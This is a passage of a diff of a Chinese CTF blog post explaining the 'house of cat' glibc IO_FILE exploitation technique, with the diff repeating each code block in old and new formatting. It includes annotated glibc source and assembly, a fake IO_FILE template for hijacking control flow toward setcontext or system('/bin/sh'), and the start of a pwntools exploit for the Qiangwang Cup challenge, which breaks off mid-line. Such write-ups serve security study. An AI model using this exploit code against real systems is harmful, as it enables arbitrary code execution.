<span class="hljs-type">int</span> count;<br> <br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> do_ftell_wide (fp);<br>  <span class="hljs-type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base<br>            == fp-&gt;_wide_data-&gt;_IO_read_end)<br>               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base<br>               == fp-&gt;_wide_data-&gt;_IO_write_ptr));<br>#需要绕过was_writing的检测<br>  <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr<br>               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>              || _IO_in_put_mode (fp));<br> <br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    <span class="hljs-keyword">return</span> WEOF;<br>......<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>其中fp结构体是我们可以伪造的(上面那个截图的rdi，为一个<strong>堆地址</strong>)，可以控制<strong>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</strong>来调用**_IO_switch_to_wget_mode**这个函数，继续跟进代码</p>
-<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">int<br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      return EOF;<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
 
 <p>对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64<br>0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx<br>0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]<br>0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56 &lt;_IO_switch_to_wget_mode+56&gt; <br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56 &lt;_IO_switch_to_wget_mode+56&gt; </span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
 
 <p>主要关注这几句，做了一下几点事情</p>
 <ul>
@@ -344,17 +135,17 @@
 <li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li>
 <li>call调用[rax2+0x18]处的内容。</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
 
 <p>而rdi现在是什么状态呢？gdb调试来看看</p>
 <p><img src="/img/article/house_of_cat/image-20221113211825072.png" alt="image-20221113211825072"></p>
 <p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，即<strong>之前__IO_wfile_seekoff函数传入那个fp</strong>，也是可控的。</p>
 <p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在<strong>开启沙箱</strong>的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入&#x2F;bin&#x2F;sh字符串**，就可执行system(“&#x2F;bin&#x2F;sh”)</p>
-<h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end<br>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base<br><span class="hljs-comment">/*如果_wide_data=fake_io_addr+0x30，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="hljs-comment">fp-&gt;_lock是一个可写地址（堆地址libc中的可写地址）*/</span><br></code></pre></td></tr></table></figure>
+<h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line"><span class="comment">/*如果_wide_data=fake_io_addr+0x30，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span></span><br><span class="line"><span class="comment">fp-&gt;_lock是一个可写地址（堆地址libc中的可写地址）*/</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p><img src="/img/article/house_of_cat/959842_JDJKTRK7GJUEUFR.png" alt="攻击流程图"></p>
 <h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，**_IO_save_end<strong>为想要调用的函数，</strong>_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_io_addr=heapbase+<span class="hljs-number">0xb00</span> <span class="hljs-comment"># 伪造的fake_IO结构体的地址</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE=p64(rdi)         <span class="hljs-comment">#_flags=rdi</span><br>fake_IO_FILE+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rcx!=0(FSOP)</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base=rdx</span><br>fake_IO_FILE +=p64(call_addr)<span class="hljs-comment">#_IO_save_end=call addr(call setcontext/system)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x1000</span>)  <span class="hljs-comment"># _lock = a writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data,rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#mode=1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libcbase+<span class="hljs-number">0x2160c0</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(fake_io_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addr</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="例题：强网杯house-of-cat"><a href="#例题：强网杯house-of-cat" class="headerlink" title="例题：强网杯house of  cat"></a>例题：强网杯house of  cat</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>整体逆向思路类似于[chunqiuIOT](<a href="https://loora1n.github.io/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/">i春秋春季赛-勇者巅峰-chunqiuIOT - 鷺雨のBlog (loora1n.github.io)</a>)那道题，也可以说是<strong>IO_FILE升级版</strong>，这里我们直接看核心的几个函数</p>
 <p><img src="/img/article/house_of_cat/image-20221113212407882.png" alt="add"></p>
@@ -367,7 +158,7 @@
 <li>只有两次edit的机会，且长度为0x30</li>
 <li>show函数固定输出0x30长度的内容</li>
 </ul>
-<h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./houseofcat  <br></code></pre></td></tr></table></figure>
+<h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./houseofcat  </span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/article/house_of_cat/image-20221110125159203.png" alt="image-20221110125159203"></p>
 <p>只能使用orw，且限制了fd为0</p>
@@ -380,435 +171,53 @@
 <li>触发<code>__malloc_assert</code>, 进入<code>_IO_wfile_seekoff</code>转到<code>_IO_switch_to_wget_mode</code></li>
 <li>setcontext执行rop链(orw需要注意fd应先<code>close(0)</code>)</li>
 </ul>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br><br>io = process(<span class="hljs-string">&#x27;./houseofcat&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;210.30.97.133&#x27;,28065)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>    gdb.attach(proc.pidof(io)[<span class="hljs-number">0</span>],<span class="hljs-string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    payload = <span class="hljs-string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span><br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,payload)<br>    <span class="hljs-comment"># payload = &quot;CAT | r00t QWB QWXF\xFF\xFF\xFF\xFF&quot;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,cont)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>, cont)<br>    <br><br>login()<br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x420</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<br><span class="hljs-comment"># p()</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#libc_base</span><br>io.recvuntil(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0d0</span><br>io.recv(<span class="hljs-number">10</span>)<br>heapbase = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span 